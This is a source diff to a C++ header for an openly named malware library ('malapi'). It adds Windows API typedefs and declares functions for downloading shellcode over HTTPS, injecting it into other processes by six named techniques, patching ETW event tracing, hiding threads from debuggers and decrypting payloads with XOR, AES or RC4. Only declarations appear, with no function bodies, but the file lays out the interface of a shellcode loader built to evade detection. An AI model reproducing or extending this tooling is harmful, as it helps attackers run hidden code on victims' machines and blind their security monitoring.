@@ -1,6 +1,8 @@
 #ifndef MALAPI_MALAPI_HPP
 #define MALAPI_MALAPI_HPP
 #include <windows.h>
+#include <winhttp.h>
+//#include "darkloadlib/darkloadlibrary.h"
 
 #pragma region [typedefs]
 
@@ -1184,6 +1186,16 @@ typedef struct _PROCESS_LOGGING_INFORMATION
 
 typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;
 
+typedef struct _PROCESS_BASIC_INFORMATION
+{
+	NTSTATUS ExitStatus;                    // The exit status of the process. (GetExitCodeProcess)
+	PPEB PebBaseAddress;                    // A pointer to the process environment block (PEB) of the process.
+	KAFFINITY AffinityMask;                 // The affinity mask of the process. (GetProcessAffinityMask) (deprecated)
+	KPRIORITY BasePriority;                 // The base priority of the process. (GetPriorityClass)
+	HANDLE UniqueProcessId;                 // The unique identifier of the process. (GetProcessId)
+	HANDLE InheritedFromUniqueProcessId;    // The unique identifier of the parent process.
+} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;
+
 typedef struct _IO_STATUS_BLOCK
 {
 	union
@@ -1248,6 +1260,59 @@ typedef enum AMSI_RESULT {
 DECLARE_HANDLE(HAMSICONTEXT);
 DECLARE_HANDLE(HAMSISESSION);
 
+// The following are message definitions.
+//
+//  Values are 32 bit values layed out as follows:
+//
+//   3 3 2 2 2 2 2 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1
+//   1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0
+//  +---+-+-+-----------------------+-------------------------------+
+//  |Sev|C|R|     Facility          |               Code            |
+//  +---+-+-+-----------------------+-------------------------------+
+//
+//  where
+//
+//      Sev - is the severity code
+//
+//          00 - Success
+//          01 - Informational
+//          10 - Warning
+//          11 - Error
+//
+//      C - is the Customer code flag
+//
+//      R - is a reserved bit
+//
+//      Facility - is the facility code
+//
+//      Code - is the facility's status code
+//
+//
+// Define the facility codes
+//
+#define FACILITY_SYSTEM                  0x0
+#define FACILITY_STUBS                   0x3
+#define FACILITY_RUNTIME                 0x2
+#define FACILITY_IO_ERROR_CODE           0x4
+
+//
+// Define the severity codes
+//
+#define STATUS_SEVERITY_WARNING          0x2
+#define STATUS_SEVERITY_SUCCESS          0x0
+#define STATUS_SEVERITY_INFORMATIONAL    0x1
+#define STATUS_SEVERITY_ERROR            0x3
+
+//
+// MessageId: SVC_ERROR
+//
+// MessageText:
+//
+//  An error has occurred (%2).
+//
+//
+#define SVC_ERROR                        ((DWORD)0xC0020001L)
+
 #pragma endregion
 
 #pragma region [ntapi_typedefs]
@@ -1261,6 +1326,19 @@ typedef PVOID(NTAPI* typeRtlAllocateHeap)(
 	_In_     SIZE_T Size
 	);
 
+typedef PVOID(NTAPI* typeRtlReAllocateHeap)(
+	_In_ PVOID HeapHandle,
+	_In_ ULONG Flags,
+	_Frees_ptr_opt_ PVOID BaseAddress,
+	_In_ SIZE_T Size
+	);
+
+typedef SIZE_T(NTAPI* typeRtlFreeHeap)(
+	_In_            PVOID HeapHandle,
+	_In_opt_        ULONG Flags,
+	_Frees_ptr_opt_ PVOID BaseAddress
+	);
+
 typedef NTSTATUS(NTAPI* typeRtlCreateUserThread)(
 	_In_      HANDLE                     ProcessHandle,
 	_In_opt_  PSECURITY_DESCRIPTOR       ThreadSecurityDescriptor,
@@ -1272,12 +1350,6 @@ typedef NTSTATUS(NTAPI* typeRtlCreateUserThread)(
 	_In_opt_  PVOID                      Parameter,
 	_Out_opt_ PHANDLE                    ThreadHandle,
 	_Out_opt_ PCLIENT_ID                 ClientId
-	);
-
-typedef SIZE_T(NTAPI* typeRtlFreeHeap)(
-	_In_            PVOID HeapHandle,
-	_In_opt_        ULONG Flags,
-	_Frees_ptr_opt_ PVOID BaseAddress
 	);
 
 typedef NTSTATUS(NTAPI* typeNtCreateSection)(
@@ -1301,6 +1373,11 @@ typedef NTSTATUS(NTAPI* typeNtMapViewOfSection)(
 	_In_        SECTION_INHERIT InheritDisposition,
 	_In_        ULONG           AllocationType,
 	_In_        ULONG           Win32Protect
+	);
+
+typedef NTSTATUS(NTAPI* typeNtUnmapViewOfSection)(
+	_In_ HANDLE ProcessHandle,
+	_In_opt_ PVOID BaseAddress
 	);
 
 typedef NTSTATUS(NTAPI* typeNtQuerySystemInformation)(
@@ -1332,6 +1409,14 @@ typedef NTSTATUS(NTAPI* typeNtQueryInformationProcess)(
 	_Out_opt_                                    PULONG ReturnLength
 	);
 
+typedef NTSTATUS(NTAPI* typeNtQueryInformationThread)(
+	_In_ HANDLE ThreadHandle,
+	_In_ THREADINFOCLASS ThreadInformationClass,
+	_Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
+	_In_ ULONG ThreadInformationLength,
+	_Out_opt_ PULONG ReturnLength
+	);
+
 typedef NTSTATUS(NTAPI* typeNtCreateProcess)(
 	_Out_ PHANDLE ProcessHandle,
 	_In_ ACCESS_MASK DesiredAccess,
@@ -1355,9 +1440,26 @@ typedef NTSTATUS(NTAPI* typeNtCreateProcessEx)(
 	_Reserved_ ULONG Reserved // JobMemberLevel
 	);
 
+typedef NTSTATUS(NTAPI* typeNtReadVirtualMemory)(
+	_In_	  HANDLE ProcessHandle,
+	_In_opt_  PVOID BaseAddress,
+	_Out_writes_bytes_to_(NumberOfBytesToRead, *NumberOfBytesRead) PVOID Buffer,
+	_In_	  SIZE_T NumberOfBytesToRead,
+	_Out_opt_ PSIZE_T NumberOfBytesRead
+	);
+
 typedef NTSTATUS(NTAPI* typeNtTerminateProcess)(
 	_In_opt_ HANDLE ProcessHandle,
 	_In_ NTSTATUS ExitStatus
+	);
+
+typedef NTSTATUS(NTAPI* typeNtResumeProcess)(
+	_In_ HANDLE ProcessHandle
+	);
+
+typedef NTSTATUS(NTAPI* typeNtResumeThread)(
+	_In_ HANDLE ThreadHandle,
+	_Out_opt_ PULONG PreviousSuspendCount
 	);
 
 typedef NTSTATUS(NTAPI* typeNtClose)(
@@ -1391,9 +1493,19 @@ typedef NTSTATUS(NTAPI* typeNtDeleteFile)(
 	_In_ POBJECT_ATTRIBUTES ObjectAttributes
 	);
 
-typedef NTSTATUS(NTAPI* typeEtwEventWrite)(
+typedef ULONG(NTAPI* typeEtwEventWrite)(
 	_In_ REGHANDLE RegHandle,
 	_In_ PCEVENT_DESCRIPTOR EventDescriptor,
+	_In_ ULONG UserDataCount,
+	_In_reads_opt_(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
+	);
+
+typedef ULONG(NTAPI* typeEtwEventWriteFull)(
+	_In_ REGHANDLE RegHandle,
+	_In_ PCEVENT_DESCRIPTOR EventDescriptor,
+	_In_ USHORT EventProperty,
+	_In_opt_ LPCGUID ActivityId,
+	_In_opt_ LPCGUID RelatedActivityId,
 	_In_ ULONG UserDataCount,
 	_In_reads_opt_(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
 	);
@@ -1403,6 +1515,12 @@ typedef NTSTATUS(NTAPI* typeNtTraceEvent)(
 	_In_ ULONG Flags,
 	_In_ ULONG FieldSize,
 	_In_ PVOID Fields
+	);
+
+typedef NTSTATUS(NTAPI* typeNtWaitForSingleObject)(
+	_In_ HANDLE Handle,
+	_In_ BOOLEAN Alertable,
+	_In_opt_ PLARGE_INTEGER Timeout
 	);
 
 #pragma endregion
@@ -1435,6 +1553,14 @@ typedef BOOL(WINAPI* typeWriteProcessMemory)(
 	_Out_ SIZE_T* lpNumberOfBytesWritten
 	);
 
+typedef BOOL(WINAPI* typeReadProcessMemory)(
+	_In_  HANDLE  hProcess,
+	_In_  LPCVOID  lpBaseAddress,
+	_Out_ LPVOID lpBuffer,
+	_In_  SIZE_T  nSize,
+	_Out_ SIZE_T* lpNumberOfBytesWritten
+	);
+
 typedef LPVOID(WINAPI* typeHeapAlloc)(
 	_In_ HANDLE hHeap,
 	_In_ DWORD dwFlags,
@@ -1449,6 +1575,12 @@ typedef BOOL(WINAPI* typeHeapFree)(
 
 typedef BOOL(WINAPI* typeCloseHandle)(
 	_In_ HANDLE hObject
+	);
+
+typedef DWORD(WINAPI* typeQueueUserAPC)(
+	_In_ PAPCFUNC  pfnAPC,
+	_In_ HANDLE    hThread,
+	_In_ ULONG_PTR dwData
 	);
 
 typedef HANDLE(WINAPI* typeCreateFileA)(
@@ -1503,6 +1635,10 @@ typedef HANDLE(WINAPI* typeCreateRemoteThread)(
 	);
 
 typedef HANDLE(WINAPI* typeGetProcessHeap)();
+
+typedef HMODULE(WINAPI* typeLoadLibraryA)(
+	_In_ LPCSTR lpLibFileName
+	);
 
 typedef LPVOID(WINAPI* typeVirtualAllocEx)(
 	_In_	 HANDLE hProcess,
@@ -1620,6 +1756,101 @@ typedef HRESULT(WINAPI* typeURLOpenBlockingStream)(
 	LPSTREAM* ppStream,
 	_Reserved_ DWORD dwReserved,
 	LPBINDSTATUSCALLBACK lpfnCB
+	);
+
+typedef HINTERNET(WINAPI* typeWinHttpOpen)(
+	_In_opt_	LPCWSTR	pszAgentW,
+	_In_		DWORD	dwAccessType,
+	_In_		LPCWSTR	pszProxyW,
+	_In_		LPCWSTR	pszProxyBypassW,
+	_In_		DWORD	dwFlags
+	);
+
+typedef HINTERNET(WINAPI* typeWinHttpConnect)(
+	_In_ HINTERNET		hSession,
+	_In_ LPCWSTR		pswzServerName,
+	_In_ INTERNET_PORT	nServerPort,
+	_In_ DWORD			dwReserved
+	);
+
+typedef HINTERNET(WINAPI* typeWinHttpOpenRequest)(
+	_In_ HINTERNET hConnect,
+	_In_ LPCWSTR   pwszVerb,
+	_In_ LPCWSTR   pwszObjectName,
+	_In_ LPCWSTR   pwszVersion,
+	_In_ LPCWSTR   pwszReferrer,
+	_In_ LPCWSTR* ppwszAcceptTypes,
+	_In_ DWORD     dwFlags
+	);
+
+typedef BOOL(WINAPI* typeWinHttpSendRequest)(
+	_In_	 HINTERNET hRequest,
+	_In_opt_ LPCWSTR   lpszHeaders,
+	_In_	 DWORD     dwHeadersLength,
+	_In_opt_ LPVOID    lpOptional,
+	_In_	 DWORD	   dwOptionalLength,
+	_In_	 DWORD	   dwTotalLength,
+	_In_	 DWORD_PTR dwContext
+	);
+
+typedef BOOL(WINAPI* typeWinHttpReadData)(
+	_In_  HINTERNET hRequest,
+	_Out_ LPVOID	lpBuffer,
+	_In_  DWORD		dwNumberOfBytesToRead,
+	_Out_ LPDWORD	lpdwNumberOfBytesRead
+	);
+
+typedef BOOL(WINAPI* typeWinHttpReceiveResponse)(
+	_In_ HINTERNET hRequest,
+	_In_ LPVOID    lpReserved
+	);
+
+typedef BOOL(WINAPI* typeWinHttpCloseHandle)(
+	_In_ HINTERNET		hInternet
+	);
+
+typedef HINTERNET(WINAPI* typeInternetOpenW)(
+	_In_ LPCWSTR	lpszAgent,
+	_In_ DWORD		dwAccessType,
+	_In_ LPCWSTR	lpszProxy,
+	_In_ LPCWSTR	lpszProxyBypass,
+	_In_ DWORD		dwFlags
+	);
+
+typedef HINTERNET(WINAPI* typeInternetOpenUrlA)(
+	_In_ HINTERNET hInternet,
+	_In_ LPCSTR    lpszUrl,
+	_In_ LPCSTR    lpszHeaders,
+	_In_ DWORD     dwHeadersLength,
+	_In_ DWORD     dwFlags,
+	_In_ DWORD_PTR dwContext
+	);
+
+typedef HINTERNET(WINAPI* typeInternetOpenUrlW)(
+	_In_ HINTERNET hInternet,
+	_In_ LPCWSTR    lpszUrl,
+	_In_ LPCWSTR    lpszHeaders,
+	_In_ DWORD     dwHeadersLength,
+	_In_ DWORD     dwFlags,
+	_In_ DWORD_PTR dwContext
+	);
+
+typedef BOOL(WINAPI* typeInternetCloseHandle)(
+	_In_ HINTERNET hInternet
+	);
+
+typedef BOOL(WINAPI* typeInternetReadFile)(
+	_In_  HINTERNET hFile,
+	_Out_ LPVOID	lpBuffer,
+	_In_  DWORD		dwNumberOfBytesToRead,
+	_Out_ LPDWORD	lpdwNumberOfBytesRead
+	);
+
+typedef BOOL(WINAPI* typeInternetSetOptionA)(
+	_In_ HINTERNET hInternet,
+	_In_ DWORD dwOption,
+	_In_ LPVOID lpBuffer,
+	_In_ DWORD dwBufferLength
 	);
 
 typedef BOOL(WINAPI* typeFlushInstructionCache)(
@@ -1762,6 +1993,14 @@ namespace malapi
 	PVOID WriteShellcodeMemory(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
 
 	//
+	// Stage Shellcode to Memory via HTTPS
+	// Requires Valid SSL Certificate if using HTTPS
+	//
+	// Returns Shellcode & Shellcode Size
+	//
+	BOOL DownloadShellcode(_In_ LPCWSTR base_url, _In_ LPCWSTR filename, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size);
+
+	//
 	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
 	//
 	BOOL CheckFileExists(_In_ LPCSTR FullPath);
@@ -1773,9 +2012,15 @@ namespace malapi
 
 	//
 	// Create Suspended Process
-	// RETURN ProcessHandle
+	// Return ProcessHandle
 	//
-	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path);
+	HANDLE CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle);
+
+	//
+	// Create Suspended Process
+	// Return ThreadHandle
+	//
+	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
 
 	//
 	// GetModuleHandle implementation with API hashing.
@@ -1791,7 +2036,7 @@ namespace malapi
 	// Patch ETW
 	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
 	//
-	BOOL PatchEtw();
+	BOOL PatchEtwSsn();
 
 	//
 	// Get epoch timestamp (ms) from SHARED_USER_DATA
@@ -1829,7 +2074,13 @@ namespace malapi
 	// Patch ETW
 	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
 	//
-	BOOL PatchEtw();
+	BOOL PatchEtwSsn(void);
+
+	//
+	// Patch ETW via EtwEventWrite/EtwEventWriteFull
+	// https://gist.github.com/wizardy0ga/7cadcc7484092ff25a218615005405b7
+	//
+	BOOL PatchEtwEventWrite(void);
 
 	//
 	// Returns PEB pointer for current process. (Retrieved from TEB)
@@ -1853,6 +2104,12 @@ namespace malapi
 	PVOID HeapAlloc(_In_ SIZE_T Size);
 
 	//
+	// ReAllocate a block of memory in the current process' heap.
+	// Returns a pointer to the allocated block, or NULL on failure.
+	//
+	PVOID HeapReAlloc(_In_ PVOID Buffer, _In_ SIZE_T Size);
+
+	//
 	// Free a block of memory in the current process' heap.
 	// Returns TRUE on success, FALSE on failure.
 	//
@@ -1864,10 +2121,56 @@ namespace malapi
 	//
 	VOID HideFromDebugger(_In_ HANDLE ThreadHandle = (HANDLE)-2);
 
+	////////////////////////////////////////////////////
+	//
+	// Injection Techniques
+	//
+
 	//
 	// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
 	//
-	BOOL InjectionNtMapViewOfSection(_In_ HANDLE ProcessHandle, BYTE* Shellcode, SIZE_T ShellcodeLength);
+	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process Injection
+	//
+	BOOL InjectionCreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Remote Thread Hijacking
+	//
+	BOOL InjectionRemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// InjectionAddressOfEntryPoint Injection
+	//
+	BOOL InjectionAddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// Process InjectionDoppleganger
+	//
+	BOOL InjectionDoppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	//
+	// QueueUserApc Injection
+	//
+	BOOL InjectionQueueUserAPC(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
+
+	////////////////////////////////////////////////////
+	//
+	// Decryption
+	//
+
+	VOID NONE(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	//
+	// XORs input with a given key, will repeat the key if KeyLen < InputLen.
+	//
+	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	VOID AES(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
+
+	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
 	//
 	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
@@ -1920,6 +2223,12 @@ namespace malapi
 	// Zero a region of memory.
 	//
 	VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size);
+
+	//
+	// Sets the current service status and reports it to the SCM.
+	// Return None
+	//
+	VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint);
 }
 
 #endif
